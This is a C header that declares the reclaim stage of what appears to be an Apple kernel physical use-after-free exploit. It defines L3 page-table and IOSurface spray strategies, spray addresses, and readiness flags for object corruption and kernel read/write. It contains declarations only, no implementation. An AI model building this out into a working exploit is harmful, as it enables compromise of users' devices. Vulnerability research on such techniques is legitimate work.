#ifndef PMAP_RECLAIM_H
#define PMAP_RECLAIM_H

#include "pmap_puaf.h"
#include <stdint.h>

#define PMAP_RECLAIM_MAGIC_U32   0xDEA1DEADu
#define PMAP_RECLAIM_MAGIC_U64   0xDEADC0DEDEADC0DEULL
#define PMAP_RECLAIM_L3_SPAN     (32ULL * 1024 * 1024)
#define PMAP_RECLAIM_SPRAY_BASE  0x400000000ULL

typedef enum {
    PMAP_RECLAIM_NONE = 0,
    PMAP_RECLAIM_L3_SPRAY,
    PMAP_RECLAIM_IOSURFACE,
    PMAP_RECLAIM_COMBINED
} pmap_reclaim_strategy_t;

typedef struct {
    pmap_reclaim_strategy_t strategy;
    int spray_count;
    int retry_attempts;
    int l3_faults;
    int l3_changed;
    int l3_unchanged;
    int iosurface_hits;
    int iosurface_hit_index;
    int write_through;
    int reclaim_ready;
    int object_corrupt_ready;
    int krw_ready;
    char strategy_name[32];
    char verdict[256];
    char error[256];
} pmap_reclaim_result_t;

typedef struct {
    int spray_count;
    int max_retries;
    int try_iosurface;
    int try_l3_spray;
} pmap_reclaim_config_t;

/* Run SPTM reclaim bridge: L3 32MB-spaced spray + optional IOSurface spray. */
int pmap_reclaim_execute(const pmap_reclaim_config_t *cfg, pmap_reclaim_result_t *out);

#endif /* PMAP_RECLAIM_H */
